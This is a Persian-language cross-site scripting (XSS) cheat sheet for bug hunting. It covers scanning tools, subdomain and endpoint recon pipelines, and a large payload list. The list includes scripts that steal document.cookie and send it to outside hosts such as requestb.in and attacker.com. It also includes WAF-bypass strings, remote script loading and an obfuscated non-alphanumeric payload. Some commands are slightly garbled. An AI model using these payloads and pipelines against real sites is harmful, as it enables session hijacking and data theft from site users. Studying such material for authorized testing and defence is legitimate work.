# 17.XSS

ابزار ها

```
https://github.com/DanMcInerney/xsscrapy
https://github.com/s0md3v/XSStrike
```

یک مجموعه کشف کننده XSS مجهز به تجزیه کننده

ابزار XSStrike ریسپانس رو با چندین تجزیه‌کننده انالیز میکنه و سپس پیلود هارو میسازه

که با انالیز محتویات متنی یکپارچه با موتور فازینگ کار می کنه

داکیومنتش

```
https://github.com/s0md3v/XSStrike/wiki/Usage
```

Classical GET

```bash
python xsstrike.py -u "http://example.com/search.php?q=query"
```

POST

```bash
python xsstrike.py -u "http://example.com/search.php" --data "q=query"
```

مسیر پیلودها

```bash
python xsstrike.py -u "http://example.com/search/form/query" --path
```

Crawl and test

```bash
python xsstrike.py -u "http://example.com/page.php" --crawl
```

پیلود هارو از فایل لود کنید و تست کنید

```bash
python3 xsstrike.py -u "http://example.com/page.php?q=query" -f /path/to/file.txt
```

پیدا کردن پارامتر های مخفی

```bash
python xsstrike.py -u "http://example.com/page.php" --params
```

خودکار کردن Rxss

روش متفاوت

```
https://github.com/yavolo/eventlistener-xss-recon
```

روش اول

پیدا کردن ساب دامنه (AssetFinder - SubFinder – Amass – Find-domain - Google Dorking)

تعداد ساب دامنه های فعال رو بیابید:

```bash
( `httprobe (Tomnomnom) – HTTPX )  >> cat subdomains.txt | httprobe | tee -a host.txt
```

از پیلود هات استفاده کن:

```jsx
`` <script/src=//Ǌ.₨></script>
```

در صورت پذیرفته نشدن ریپورتت

```bash
cat host.txt | crawler | tee -a endpoint.txt   & cat host.txt | waybackurl | tee -a endpoint.txt
```

بعد از پیدا کردن تمام endpoint ها من شروع به فاز کردن تمام پارامتر ها برای پیدا کردن اسیب پذیری xss با کمک ابزار qsreplace کردم. دستور استفاده شده:

```bash
cat endpoint.txt | qsreplace ‘“><img src=x onerror=alert(1)> | tee -a xss_fuzz.txt
```

بعد از اجرای کامند من مجبور شدم پارامترهایی رو که پیلودهامو در یک متن ساده reflect میکنه بررسی کنم, بنابراین ابزاری به نام FREQ ایجاد کردم, این ابزار چندین ریکوئست ارسال میکنه تا بررسی کنه که ایا ریسپانس حاوی پیلود, URL های اسیب دیده رو به ما برمیگردونه. کامندی که برای انجام این حمله استفاده کردم:

```bash
cat xss_fuzz.txt | freq | tee -a possible_xss.txt
```

روش دوم

```bash
https://github.com/raoufmaklouf/cleanP
https://github.com/raoufmaklouf/injectP
https://gist.github.com/raoufmaklouf/76e747ea49abcdb499ac8ff88f10148b
```

تارگت تنها

```bash
`gau target.com | cleanP | injectP 'T%22rSpGeUMo%3E7N' | httpx -ms 'T"rSpGeUMo>7N' | nuclei -t XSS.yaml -o xss.txt
```

چندتا تارگت

```bash
cat AllEndPoint.txt | cleanP | injectP 'T%22rSpGeUMo%3E7N' | httpx -ms 'T"rSpGeUMo>7N' | nuclei -t XSS.yaml -o xss.txt
```

روش سوم

اول از همه, من همه ساب دامنه های target.com رو با [subfinder](https://github.com/projectdiscovery/subfinder) پیدا کردم و بعدش با [knockpy](https://github.com/guelfoweb/knock) ساب دامنه هارو پیدا کردم

سپس از [waybackurls](https://github.com/tomnomnom/waybackurls) برای بدست اوردن پارامترها برای تست XSS استفاده کردم

و بعدش از [gf](https://github.com/tomnomnom/gf) برای بدست اوردن پارامترهای XSS احتمالی استفاده کردم

بعد از مرتب کردن URL ها از [KXSS](https://github.com/Emoe/kxss) استفاده کردم

و از [Dalfox](https://github.com/hahwul/dalfox) چیزی نگرفتم

روش چهارم

```
https://mirror-medium.com/?m=https://medium.com/@c0nqr0r/reading-robots-txt-got-me-4-xss-reports-9fd2234c635f&fbclid=IwAR1Z9wF54pIr0l3uLd9xLxiip3gbiWPDo-CFkNaGtrM7FTrLXDBzfI8pqKw
```

نکات

اگر XSS از طریق UI اجرا نمیشه, میتونید سعی کنید از طریق API تزریق کنید

کد تزریق شده ممکنه به همون میزان امنیت روی UI جلوش گرفته بشه یا ممکنه فیلترها اینجا وجود نداشته باشند

پیلود ها

```
# Document.location
<script>document.location('http://IP_EXTERNE/'+document.cookie)</script>
<script>document.location.href = 'http://requestb.in/XXXXXX?cookies =' + document.cookie;</script>

# Window
<script>window.open("http://monserveur/Cookie="+document.cookie)</script>
<script>window.location='http://monsite.free.fr/script.php?cookies='+(document.cookie);</script>

# Document.write
<script>document.write('<img src="https://requestb.in/xxxxx?cookie="+document.cookie>admin</img>');</script>
admin"></i>)</span><script>document.write("<img src=http://requestb.in/XXXXX?cookie=".concat(encodeURI(document.cookie)).concat("/>"))</script><i>

<script>var xhr = new XMLHttpRequest();xhr.open('POST', 'http://requestb.in/w0sw22w0', true);xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');xhr.send(document.cookie);</script>

# alert(1) in JS
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>

injecting inside of input tags
<input/onfocus=alert(0) autofocus>
<input/onfocus=alert`0` autofocus>
<input/onfocus=prompt`0` autofocus>
1'"><input/onfocus={alert`1`} autofocus>
```

```
# WAF Bypass
'';!--"<XSS>=&{()}
<IMG SRC="javascript:alert('XSS');">
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<svg/onload=(((confirm(1))))>
confirm()
confirm``
(confirm``)
{confirm``}
[confirm``]
(((confirm)))``
co\u006efirm()
new class extends confirm``{}
[8].find(confirm)
[8].map(confirm)
[8].some(confirm)
[8].every(confirm)
[8].filter(confirm)
[8].findIndex(confirm)

# No HTML events
<script>alert(1)//
<script>alert(1)<!--
<script>alert(1)%0A-->
<script src=data:,alert(1)>
<script src=//HOST/FILE>
<script src=https:DOMAIN/FILE>
<svg><script xlink:href=//HOST/FILE>
<svg><script xlink:href=https:DOMAIN/FILE>
<svg><script xlink:href=data:,alert(1)>
<svg/onload=(confirm(1))>
<svg/onload=confirm(1)>

# Stealing the source code without triggering browser restrictions
<svg/onload="(new Image()).src='//attacker.com/'%2Bdocument.documentElement.innerHTML">

# Non alphanumeric alert() payload
Ð=[],Ř=+!+Ð,ˍ=Ř+Ř+Ř,Š=!!Ð+Ð,Ť=!Ð+Ð,Ǎ=(!Ð+{})[Ř+[+Ð]],Č=(Ð+{})[Ř],Ȟ=Š[Ř],Ě=Š[+Ð],_=Ť[ˍ]+Č+Ȟ+Ě,ǰ=Ð[_]+Ð,š=Ð[Ð]+Ð,Ð[_][Ǎ+Č+(š)[Ř]+Ť[ˍ]+Ě+Ȟ+(š)[+Ð]+Ǎ+Ě+Č+Ȟ](Ť[Ř]+Ť[Ř+Ř]+Š[ˍ]+Ȟ+Ě+ǰ[Ř+[ˍ]]+ǰ[Ř+[ˍ+Ř]])()
```